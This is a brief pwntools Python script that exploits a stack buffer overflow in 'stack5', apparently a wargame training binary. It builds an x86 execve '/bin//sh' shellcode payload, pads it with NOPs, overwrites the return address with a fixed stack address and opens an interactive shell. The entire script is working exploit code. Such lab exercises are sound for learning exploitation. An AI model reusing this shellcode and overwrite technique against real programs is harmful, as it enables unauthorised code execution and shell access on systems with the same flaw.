from pwn import *

target = process("./stack5/stack5")
elf = context.binary = ELF("./stack5/stack5", checksec = False)
context.log_level = "debug"


shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

length = len(shellcode)
shellcode += b"\x90"*(76-length)
shellcode += p32(0xffffcf00)

print(shellcode)

target.sendline(shellcode)
target.interactive()
